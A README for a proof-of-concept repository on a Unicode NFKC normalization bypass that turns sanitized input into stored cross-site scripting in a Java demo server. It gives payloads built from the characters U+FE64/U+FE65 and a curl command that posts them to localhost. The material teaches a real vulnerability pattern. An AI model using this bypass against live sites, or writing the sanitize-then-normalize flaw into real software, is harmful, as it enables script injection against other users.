# Unicode Normalization Bypass XSS (NFKC XSS) Exploit

This repository contains a proof-of-concept (PoC) exploit for a **Unicode Normalization Bypass XSS** vulnerability in a Java-based web application.
The vulnerability arises due to improper handling of Unicode characters when sanitizing user input.

## Vulnerability Details
- The application attempts to sanitize user input to prevent Cross-Site Scripting (XSS) attacks.
- However, after sanitization, the input is normalized using `Normalizer.normalize(input, Normalizer.Form.NFKC)`.
- The **NFKC normalization** transforms certain Unicode characters into their ASCII equivalents, which can bypass the initial sanitization process.
- Specifically, attackers can use:
  - `U+FE64` (`﹤`) to represent `<`
  - `U+FE65` (`﹥`) to represent `>`
- This allows JavaScript injection even after the sanitization process.

## Exploit Scenario
An attacker can:
1. Submit a specially crafted comment containing `﹤script﹥alert(document.domain);﹤/script﹥`.
2. The server sanitizes the input but then applies **NFKC normalization**, which transforms `﹤` and `﹥` into `<` and `>`.
3. The sanitized and normalized data is stored in the database and later displayed in the browser without proper escaping.
4. The injected JavaScript executes when another user views the comment section.

## Exploit Usage

### 1. Run the vulnerable Java server:
```bash
java -cp .:sqlite-jdbc-3.36.0.3.jar HttpServerExample
```

### 2. Insert an XSS payload using cURL:
```bash
curl -X POST http://localhost:8000/comment -d "comment=﹤script﹥alert('XSS');﹤/script﹥"
```

### 3. Open the comment page in a browser:
```bash
http://localhost:8000/comments
```

### 4. If the exploit is successful, an alert box with the current domain should appear! 🚀




